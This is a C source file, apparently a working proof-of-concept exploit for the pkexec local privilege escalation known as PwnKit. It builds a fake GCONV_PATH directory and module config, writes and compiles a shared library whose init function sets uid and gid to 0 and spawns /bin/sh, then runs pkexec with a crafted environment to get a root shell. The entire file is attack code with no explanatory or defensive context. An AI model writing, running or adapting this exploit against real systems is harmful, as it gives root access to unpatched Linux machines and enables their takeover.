#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    // 1. Create the directory structure for the exploit
    system("mkdir -p 'GCONV_PATH=.'");
    system("touch 'GCONV_PATH=./pwnkit'");
    system("chmod a+x 'GCONV_PATH=./pwnkit'");
    system("mkdir -p pwnkit");

    // 2. Create the malicious config file
    system("echo 'module UTF-8// PWNKIT// pwnkit 2' > pwnkit/gconv-modules");

    // 3. Write the payload (the code that gives us the shell)
    FILE *f = fopen("lib.c", "w");
    fprintf(f, "#include <stdio.h>\n");
    fprintf(f, "#include <stdlib.h>\n");
    fprintf(f, "#include <unistd.h>\n");
    fprintf(f, "void gconv() {}\n");
    fprintf(f, "void gconv_init() { setuid(0); setgid(0); system(\"/bin/sh\"); exit(0); }");
    fclose(f);

    // 4. Compile the payload library
    system("gcc lib.c -o pwnkit/pwnkit.so -shared -fPIC");

    // 5. Trigger the exploit
    char *env[] = { "pwnkit", "PATH=GCONV_PATH=.", "CHARSET=PWNKIT", "SHELL=pwnkit", NULL };
    execve("/usr/bin/pkexec", (char*[]){NULL}, env);

    return 0;
}